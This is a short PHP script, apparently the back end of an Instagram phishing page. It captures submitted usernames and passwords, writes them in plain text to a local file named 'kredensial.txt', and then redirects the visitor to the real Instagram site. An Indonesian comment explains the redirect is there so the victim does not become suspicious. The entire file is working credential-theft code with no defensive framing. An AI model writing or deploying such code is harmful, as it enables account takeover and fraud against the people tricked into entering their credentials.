<?php
$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("kredensial.txt", "a");
fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
fclose($file);

// Redirect ke Instagram asli biar korban tidak curiga
header("Location: https://www.instagram.com");
exit();
?>